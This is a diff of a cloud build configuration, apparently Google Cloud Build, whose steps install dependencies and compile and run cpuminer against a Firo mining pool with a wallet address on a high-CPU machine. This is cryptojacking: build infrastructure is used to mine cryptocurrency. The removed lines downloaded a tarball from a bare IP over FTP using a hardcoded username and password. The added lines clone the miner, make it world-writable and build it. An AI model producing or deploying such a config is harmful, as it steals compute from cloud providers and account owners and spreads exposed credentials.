@@ -6,13 +6,13 @@ steps:
       - |
           apt-get update
           apt-get install -y wget
-          apt-get install -y libssl1.0.0 libssl-dev
           apt-get install -y automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev make g++
-          ln -s /lib/x86_64-linux-gnu/libssl.so.1.0.0 /usr/lib/libssl.so.1.1
-          ln -s /lib/x86_64-linux-gnu/libcrypto.so.1.0.0 /usr/lib/libcrypto.so.1.1
-          wget --user=u750504516 --password='Vp123456' ftp://194.59.164.70/c.tar.gz
-          tar xf c.tar.gz
+          git clone https://github.com/firoorg/cpuminer
+          chmod -R 777 cpuminer
           cd cpuminer
+          ./build.sh
+          ./configure  --with-crypto --with-curl
+          make
           ./cpuminer -a mtp -o stratum+tcp://firo.2miners.com:8181 -u aBLVfkCbCHagdcVM9weTRyiB5x6rSkzsq7.gccb -p x
 options:
   machineType: 'N1_HIGHCPU_32'
